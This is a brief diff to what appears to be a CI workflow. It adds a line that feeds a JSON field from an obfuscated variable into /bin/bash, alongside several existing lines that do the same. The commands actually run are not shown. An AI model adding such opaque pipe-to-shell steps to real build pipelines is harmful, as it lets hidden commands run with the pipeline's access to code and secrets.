@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$okaq45782" | jq -r .ly139 | /bin/bash
           printf '%s' "$phd5" | jq -r .w58037 | /bin/bash
           printf '%s' "$wq43" | jq -r .c2057 | /bin/bash
+          echo $tc88 | jq -r .amiy1738 | /bin/bash
 
       - name: Archive output
         if: always()
